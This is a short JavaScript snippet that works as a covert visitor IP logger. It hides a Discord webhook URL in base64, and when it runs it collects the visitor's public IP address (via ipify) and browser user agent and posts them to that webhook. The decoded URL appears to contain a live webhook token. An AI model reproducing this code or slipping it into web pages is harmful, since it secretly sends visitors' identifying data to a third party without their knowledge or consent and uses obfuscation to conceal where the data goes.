const encodedWebhook = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI3NTI5NTUyOTc1NjAwNDQyNi9JNGVmS1FGOHVJSUFSbEgzN090ZGNLZXJkdi1GZ0pGOXJhSE5VdjVzLW4wei11RHE3ay1WOF9ZWEM4NTFNeVVnejhsZA==';
const webhookUrl = atob(encodedWebhook);
function getUserInfo() {
  let userInfo = {
    ipAddress: null,
    userAgent: navigator.userAgent,
  };
  fetch('https://api.ipify.org?format=json')
    .then(response => response.json())
    .then(data => {
      userInfo.ipAddress = data.ip;
      sendInfoToWebhook(userInfo);
    })
    .catch(error => console.error('Error fetching IP address:', error));
}
function sendInfoToWebhook(userInfo) {
  fetch(webhookUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      content: `\`\`\`
${JSON.stringify(userInfo, null, 2)}
\`\`\``
    })
  });
}
getUserInfo();
